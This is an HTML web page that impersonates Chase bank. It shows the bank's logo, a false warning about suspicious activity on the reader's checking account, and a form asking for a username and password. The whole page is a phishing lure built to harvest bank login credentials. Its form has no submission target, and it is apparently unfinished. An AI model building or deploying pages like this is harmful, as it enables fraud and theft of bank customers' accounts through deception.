<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="utf-8">
        <title>Suspicious Activity</title>

        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0/css/bootstrap.min.css" />
        
      
        <link rel="stylesheet" href="style.css" />
      </head>

      <body>
        <div class="row" id="LOGO">
            <img src="chase.png" alt="chase logo">
        </div>

            
        <div class="container">

            <div class="row" id="summary">
                <p>
                    We have detected suspicious activity with regard to your Chase Checking account!

                    Please Login to your Account to confirm the activity was you!
                </p>
            </div>
            <div class="row" id="login">
                <form>
                    <label for="username">User name:</label><br>
                    <input type="text" id="username" name="username"><br>
                    <label for="password">Password:</label><br>
                    <input type="text" id="password" name="lname">
                  </form>
            </div>

    </div>
    </body>
